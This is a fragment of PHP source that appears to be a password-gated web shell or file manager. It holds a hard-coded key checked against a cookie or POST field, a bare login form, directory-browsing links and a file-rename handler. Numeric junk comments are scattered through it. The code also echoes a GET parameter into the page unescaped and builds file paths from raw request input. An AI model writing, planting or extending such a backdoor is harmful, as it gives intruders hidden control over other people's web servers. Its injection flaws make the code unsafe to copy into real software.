...
$auth_key = "666dd12104d51161b4e7a4300216e606";
...
$pass = false;
if (isset($_COOKIE['pw_name_56380'])) {
    if(($_COOKIE['pw_name_56380']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_56380'])) {
        if(($_POST['pw_name_56380']) == $auth_key) {
            setcookie("pw_name_56380", $_POST['pw_name_56380']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_56380' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724146615686562 1724146615404809 1724146615270153 1724146615298782
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724146615686562 1724146615404809 1724146615270153 1724146615298782
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724146615686562 1724146615404809 1724146615270153 1724146615298782
            $name = PATH . "/" . $_GET['r'];
